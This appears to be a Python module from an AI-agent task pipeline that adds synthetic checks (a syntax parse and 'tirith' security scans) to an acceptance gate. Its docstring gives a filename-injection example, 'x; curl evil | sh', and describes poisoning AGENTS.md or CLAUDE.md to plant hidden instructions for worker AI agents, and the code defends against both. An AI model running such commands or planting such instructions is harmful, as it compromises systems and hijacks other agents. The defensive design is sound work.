"""D5.5 cheap-gate widening -- synthetic check specs (CD-036).

Fork ruling 5, executed: "widen at D5.5 by injecting synthetic check specs into
``ac_results``, which ``run_ac_checks`` already accepts as a parameter -- one
evaluator, one verdict, zero change to ``ac_check_runner``."

THE SEAM
--------
``ac_check_runner.gate()`` derives its work from ``parse_fn(body)[3]``, and
``build_graph.make_cheap_gate`` already passes ``parse_fn=deps.parse_ac``. So
wrapping that one callable is the entire injection point. No change to
ac_check_runner, one evaluator, one verdict -- exactly as ruled.

THE FREE PATH IS PRESERVED, TWICE OVER
--------------------------------------
CD-034/CD-035 rest on a card with no parseable ``## AC`` being unable to reach a
priced edge, because ``gate()`` returns ``no_checks`` before any subprocess and
``arbiter_decision`` then returns NO_ARBITER. Injecting specs unconditionally
would give such a card a non-empty ``ac_results``, so ``gate()`` would return
``all_pass``/``exception`` instead -- and a provably free card would silently
become a priced one, with no line of cli.py changed.

RULED 2026-08-20: inject ONLY into a NON-EMPTY authored result. `wrap_parse_fn`
returns the authored tuple untouched when ``ac_results`` is falsy. Independently,
the dispatcher hook's spend split calls the REAL ``parse_ac_text``, never the
wrapped one, so the guarantee does not depend on this module being correct.
Both are asserted by the driver.

WHY THE CHECKS KEY ON JSON AND NOT ON EXIT STATUS
--------------------------------------------------
Measured on the box 2026-08-20, tirith's exit codes are:

    clean tree                      0   (at every --fail-on level)
    findings at/above threshold     1
    findings below threshold        2
    MALFORMED INVOCATION            2   <-- clap's usage-error code

rc 2 is overloaded. A gate keyed on exit status cannot distinguish a
below-threshold finding from a typo in its own command -- the exact
broken-and-passing-look-alike failure this codebase keeps rediscovering. So the
tirith specs use ``--format json`` and evaluate the envelope INSIDE the check
command, keeping ``expect=exit:0`` at the spec level. (CD-036's docstring said
``expect=stdout~`` here; the shipped ``_spec`` has always used
``expect_kind="exit"``. Corrected 2026-08-20, CD-037.)

    findings == []     -> parses   -> passed
    any finding        -> parses   -> failed
    malformed command  -> no JSON  -> unparseable -> failed   (fail-closed)
    tirith absent      -> empty    -> unparseable -> failed   (fail-closed)

CORRECTED 2026-08-20 (CD-037). CD-036 keyed this gate on the marker
``"total_findings": 0,``, measured from a DIRECTORY scan. This module asks for
the PER-FILE envelope, and the two are DIFFERENT SCHEMAS:

    tirith scan ... --file F   -> schema_version 3, keys schema_version /
                                  path / is_config_file / findings.
                                  NO ``total_findings`` KEY AT ALL.
    tirith scan ... DIR        -> schema_version 4, keys including
                                  scanned_count, ``total_findings``, files[].

So the marker could never match, ``grep -q`` never fired, and because the loop
fails closed, EVERY CLEAN FILE FAILED THE GATE. It went unnoticed because every
card that ever exercised this gate -- CD-036's own probe and both AC-3 arms --
also carried a deliberately failing ``## AC`` check, so the summary verdict was
``exception`` either way and the accidental failure hid inside the intended one.
A gate with no fixture that is expected to PASS is not tested.

The check now PARSES the per-file envelope (``CLEAN_PREDICATE``) rather than
matching a substring of it. Threshold semantics remain
observed-and-unexplained -- a HIGH-only tree returns 1 even at ``--fail-on
critical`` -- and nothing here depends on them, which is still the point.

SCOPE: CHANGED FILES, PLUS AN UNCONDITIONAL AI-INSTRUCTION CARVE-OUT
---------------------------------------------------------------------
Scanning the whole worktree fails every card on findings it never introduced,
so the gate would be unadoptable on any repo with existing debt. Scanning only
changed files fixes that -- but leaves this system's OWN exposure uncovered:
workers read ``AGENTS.md`` and ``CLAUDE.md`` out of the card workspace, and the
attack is to poison one of them ONCE. No later card touches them, so no later
card's changed-file list contains them, so a diff-scoped gate would never look
again. tirith's ``agent_instruction_hidden`` rule -- whose own ``agent_view``
field describes exactly this threat -- would fire on the introducing card and
never after.

So: changed files, AND a fixed unconditional scan of the AI-instruction set.
The second spec's command is CONSTANT, which also means it carries no
attacker-supplied text.

FILENAMES ARE ATTACKER-CONTROLLED
----------------------------------
The changed-file list is interpolated into a command run through ``/bin/sh -c``,
and a worker or card author chooses filenames. ``x; curl evil | sh`` would
execute. Every path goes through ``shlex.quote``; paths are additionally
filtered to regular files that EXIST (a deleted path would make tirith error,
emit no JSON, and fail the card for deleting a file), rejected if they contain a
newline or a NUL, and capped at MAX_FILES so N process spawns cannot exhaust
``ac_check_runner``'s 60s per-check timeout and turn a large card into an
``unrunnable`` park for size rather than content. What is dropped is RECORDED in
the spec text rather than silently omitted.
"""

from __future__ import annotations

import os
import shlex

# Staged copy. MUST live under a path bwrap already binds: _wrap ro-binds /usr
# and nothing else outside the workspace, and _extra_ro_bind_denied REFUSES
# anything under ~/.hermes -- which is where the profile copy lives. That
# deny-list is a security guard protecting profiles/*/.env and is never to be
# widened; staging into /usr is what makes tirith reachable without touching it.
TIRITH = "/usr/local/bin/tirith"

TIRITH_PROFILE = "ai-agent-repo"

# The clean predicate, applied to ONE per-file envelope arriving on stdin.
#
# NOT a string match, and the reason is measured rather than stylistic.
# CD-036 keyed on '"total_findings": 0,'. That key does not exist in the
# envelope this module actually asks for: `--file` returns schema_version 3
# ({"schema_version","path","is_config_file","findings"}), while a DIRECTORY
# scan returns schema_version 4 (which does carry "total_findings"). CD-036
# measured the directory envelope and then wrote --file invocations, so the
# marker could never match, `grep -q` never fired, and _tirith_loop's
# fail-closed design turned every CLEAN file into exit 1. Two schemas, one
# marker, and no test that distinguished clean input from dirty.
#
# The naive repair -- swapping the marker to '"findings": []' -- is ALSO
# broken: `grep -q` uses BRE, where `[]` opens a bracket expression instead
# of matching two literal brackets, so it fails on clean input exactly like
# the original. `grep -qF` does work, but is pinned to tirith's
# pretty-printer spacing. Measured, all four, 2026-08-20.
#
# Parsing fails closed three ways: unparseable stdin (which INCLUDES the
# empty stream, i.e. tirith could not run at all), a missing `findings` key
# (schema drift -- a future schema_version bump degrades to "refuse", not to
# "pass"), and any non-empty findings array. It is also independent of
# --fail-on threshold semantics, which remain observed-and-unexplained.
CLEAN_PREDICATE = (
    "import json,sys\n"
    "try:\n"
    "    d=json.load(sys.stdin)\n"
    "except Exception:\n"
    "    sys.exit(1)\n"
    "f=d.get('findings')\n"
    "sys.exit(0 if isinstance(f,list) and not f else 1)\n")

# Read by this project's own workers out of the card workspace. Scanned whether
# or not the card touched them -- see the module docstring.
AI_INSTRUCTION_FILES = ("CLAUDE.md", "AGENTS.md", ".cursorrules")

# Synthetic entries start here so they are distinguishable from authored ACs in
# the graph's ac-execution record. run_ac_checks copies `index` into each
# verdict, so this survives into the record without any change to that module.
SYNTHETIC_INDEX_BASE = 900

# Bounds the process spawns behind ac_check_runner's 60s per-check timeout.
MAX_FILES = 200

_PY_SUFFIXES = (".py",)


def _existing_regular(workspace: str, rel_paths) -> tuple:
    """(kept, dropped_reason_counts). Filters the changed-file list.

    Deletions are the trap: `git diff --name-only` lists a removed path, and
    pointing tirith at a path that no longer exists produces an error, no JSON,
    no regex match -- failing every card that deletes a file. Filtering to
    paths that still exist is what stops that.
    """
    kept = []
    dropped = {"missing": 0, "unsafe_name": 0, "over_cap": 0}
    for rel in rel_paths or ():
        if not rel:
            continue
        if "\n" in rel or "\0" in rel:
            # shlex.quote would make these safe to execute, but a newline in a
            # command recorded into a checkpointed channel is not worth the
            # legibility cost, and such a name is pathological anyway.
            dropped["unsafe_name"] += 1
            continue
        full = os.path.join(workspace, rel)
        if not os.path.isfile(full):
            dropped["missing"] += 1          # deleted, or a submodule/dir entry
            continue
        if len(kept) >= MAX_FILES:
            dropped["over_cap"] += 1
            continue
        kept.append(rel)
    return kept, dropped


def _spec(index, text, command, *, expect_kind="exit", expect_value="0"):
    """One ac_results-shaped entry. Shape mirrors parse_ac_text's output exactly
    so run_ac_checks cannot tell an injected spec from an authored one."""
    return {
        "index": index,
        "text": text,
        "checked": False,
        "kind": "check",
        "check": {"command": command, "expect_kind": expect_kind,
                  "expect_value": expect_value, "expect_source": None},
        "judgment": None,
        "status": "unrun",
        "synthetic": True,
    }


def syntax_spec(py_files, index) -> dict:
    """Every changed .py file parses.

    ast.parse, NOT `python3 -m compileall`: compileall writes __pycache__ into
    the workspace, and the workspace is the tree the next derived diff is taken
    from -- so the syntax check would inject its own artefacts into the change a
    reviewer is paid to read. This writes nothing.

    Paths arrive as argv, not inside the -c source, so a filename can never be
    interpreted as Python.
    """
    quoted = " ".join(shlex.quote(p) for p in py_files)
    prog = ("import ast,sys\n"
            "for p in sys.argv[1:]:\n"
            "    ast.parse(open(p, encoding='utf-8', errors='replace').read(), p)\n")
    command = "python3 -c %s %s" % (shlex.quote(prog), quoted)
    return _spec(index,
                 "syntax: %d changed Python file(s) parse" % len(py_files),
                 command)


def _tirith_loop(paths_expr: str) -> str:
    """A /bin/sh loop running tirith once per path, failing closed.

    `cmd | grep -q` is deliberate over `cmd && grep`: if tirith cannot execute,
    grep receives empty input, does not match, and the loop exits non-zero.
    Absence of evidence fails the check rather than passing it. pipefail is not
    available in POSIX sh and is not needed for that reason.
    """
    return ("for f in %s; do [ -f \"$f\" ] || continue; "
            "%s scan --format json --profile %s --file \"$f\" "
            "| python3 -c %s || exit 1; done"
            % (paths_expr, shlex.quote(TIRITH), shlex.quote(TIRITH_PROFILE),
               shlex.quote(CLEAN_PREDICATE)))


def tirith_changed_spec(files, index) -> dict:
    """tirith over the files this card changed."""
    quoted = " ".join(shlex.quote(p) for p in files)
    return _spec(index,
                 "tirith: %d changed file(s) clean (hidden content / config "
                 "poisoning / supply-chain)" % len(files),
                 _tirith_loop(quoted))


def tirith_ai_instruction_spec(index) -> dict:
    """tirith over the AI-instruction set, whether or not the card touched it.

    CONSTANT command -- no attacker-supplied text reaches the shell here. This
    is the carve-out that keeps a once-poisoned AGENTS.md from becoming
    permanently invisible to a diff-scoped gate.
    """
    quoted = " ".join(shlex.quote(p) for p in AI_INSTRUCTION_FILES)
    return _spec(index,
                 "tirith: AI-instruction files clean (%s) -- scanned whether or "
                 "not this card touched them" % ", ".join(AI_INSTRUCTION_FILES),
                 _tirith_loop(quoted))


def synthetic_specs(workspace: str, changed_files, *,
                    base_index: int = SYNTHETIC_INDEX_BASE) -> list:
    """The specs to append to a card's authored ac_results.

    The AI-instruction spec is ALWAYS produced. The two changed-file specs are
    produced only when there is something in scope for them, so a card that
    changed no Python does not carry an empty syntax check that passes
    vacuously.
    """
    kept, dropped = _existing_regular(workspace, changed_files)
    specs = []
    idx = base_index

    py = [p for p in kept if p.endswith(_PY_SUFFIXES)]
    if py:
        specs.append(syntax_spec(py, idx))
        idx += 1

    if kept:
        spec = tirith_changed_spec(kept, idx)
        if any(dropped.values()):
            # Never a silent cap. A gate that quietly stopped covering things
            # reads as "covered everything" in the record.
            spec["text"] += " [dropped: %s]" % ", ".join(
                "%s=%d" % (k, v) for k, v in sorted(dropped.items()) if v)
        specs.append(spec)
        idx += 1

    specs.append(tirith_ai_instruction_spec(idx))
    return specs


def wrap_parse_fn(parse_fn, workspace: str, changed_files):
    """Wrap a parse_ac_text-shaped callable so gate() sees the synthetic specs.

    Returns the authored tuple UNTOUCHED when ac_results is falsy. That is the
    CD-034/CD-035 free-path guarantee: a card with no parseable ## AC must keep
    receiving `no_checks` from gate(), or a provably free card becomes a priced
    one with nothing in cli.py changed.
    """

    def _wrapped(body):
        count, passed, source, results = parse_fn(body)
        if not results:
            return count, passed, source, results
        extra = synthetic_specs(workspace, changed_files)
        return (count or 0) + len(extra), passed, source, list(results) + extra

    return _wrapped
